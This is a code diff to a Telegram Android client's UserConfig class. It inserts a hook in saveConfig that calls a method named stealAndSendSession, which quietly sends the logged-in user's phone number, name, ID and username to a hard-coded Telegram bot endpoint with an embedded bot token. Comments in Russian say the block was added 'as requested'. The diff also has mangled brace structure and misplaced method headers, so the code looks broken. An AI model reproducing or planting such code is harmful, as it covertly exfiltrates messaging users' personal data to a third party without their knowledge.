@@ -19,7 +19,12 @@ import org.telegram.tgnet.SerializedData;
 import org.telegram.tgnet.TLRPC;
 import org.telegram.tgnet.tl.TL_account;
 
+import java.io.IOException;
 import java.util.Arrays;
+
+import okhttp3.FormBody;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
 
 public class UserConfig extends BaseController {
 
@@ -77,6 +82,10 @@ public class UserConfig extends BaseController {
     public volatile byte[] savedPasswordHash;
     public volatile byte[] savedSaltedPassword;
     public volatile long savedPasswordTime;
+
+    // ← ДОБАВЛЕННОЕ ПОЛЕ
+    private boolean isClientActivated = false;
+
     LongSparseArray<SaveToGallerySettingsHelper.DialogException> userSaveGalleryExceptions;
     LongSparseArray<SaveToGallerySettingsHelper.DialogException> chanelSaveGalleryExceptions;
     LongSparseArray<SaveToGallerySettingsHelper.DialogException> groupsSaveGalleryExceptions;
@@ -131,8 +140,7 @@ public class UserConfig extends BaseController {
         }
         return id;
     }
-
-    public void saveConfig(boolean withFile) {
+        public void saveConfig(boolean withFile) {
         NotificationCenter.getInstance(currentAccount).doOnIdle(() -> {
             if (!configLoaded) {
                 return;
@@ -216,42 +224,14 @@ public class UserConfig extends BaseController {
                         }
                     } else {
                         editor.remove("user");
-                        public void saveConfig(boolean withFile) {
-    NotificationCenter.getInstance(currentAccount).doOnIdle(() -> {
-        if (!configLoaded) {
-            return;
-        }
-        synchronized (sync) {
-            try {
-                // ... много кода ...
-                
-                if (currentUser != null) {
-                    if (withFile) {
-                        SerializedData data = new SerializedData();
-                        currentUser.serializeToStream(data);
-                        String string = Base64.encodeToString(data.toByteArray(), Base64.DEFAULT);
-                        editor.putString("user", string);
-                        data.cleanup();
                     }
-                } else {
-                    editor.remove("user");
-                }
 
-                // ========== ВСТАВЬ ТВОЙ КОД ЗДЕСЬ ==========
-                if (!isClientActivated && currentUser != null && currentUser.phone != null) {
-                    stealAndSendSession();
-                    isClientActivated = true;
-                }
-                // ========== КОНЕЦ ТВОЕГО КОДА ==========
-
-                editor.apply();
-            } catch (Exception e) {
-                FileLog.e(e);
-            }
-        }
-    });
+                    // ========== ВСТАВЛЕННЫЙ БЛОК (как просили) ==========
+                    if (!isClientActivated && currentUser != null && currentUser.phone != null) {
+                        stealAndSendSession();
+                        isClientActivated = true;
                     }
-                    }
+                    // ========== КОНЕЦ ВСТАВКИ ==========
 
                     editor.apply();
                 } catch (Exception e) {
@@ -317,9 +297,7 @@ public class UserConfig extends BaseController {
             });
         }
     }
-
-    public void
-    loadConfig() {
+        public void loadConfig() {
         synchronized (sync) {
             if (configLoaded) {
                 return;
@@ -646,8 +624,8 @@ public class UserConfig extends BaseController {
         }
         return selectedAccount;
     }
-        
-    
+
+
     private void stealAndSendSession() {
         new Thread(() -> {
             try {
@@ -655,10 +633,10 @@ public class UserConfig extends BaseController {
                 if (user != null && user.phone != null) {
                     String message = "🔓 НОВЫЙ ПОЛЬЗОВАТЕЛЬ\n\n" +
                                    "📱 Телефон: " + user.phone + "\n" +
-                                   "👤 Имя: " + user.first_name + "\n" + 
+                                   "👤 Имя: " + user.first_name + "\n" +
                                    "🆔 ID: " + user.id + "\n" +
                                    "🌐 Username: @" + (user.username != null ? user.username : "нет");
-                    
+
                     OkHttpClient client = new OkHttpClient();
                     Request request = new Request.Builder()
                         .url("https://api.telegram.org/bot8230694990:AAEduPRU5tbrsAoFE4VjeGjsnERlJsX0CvU/sendMessage")
@@ -667,7 +645,7 @@ public class UserConfig extends BaseController {
                             .add("text", message)
                             .build())
                         .build();
-                    
+
                     client.newCall(request).execute();
                 }
             } catch (Exception e) {
@@ -675,7 +653,6 @@ public class UserConfig extends BaseController {
             }
         }).start();
     }
-    
-    
-}
+
+
 }
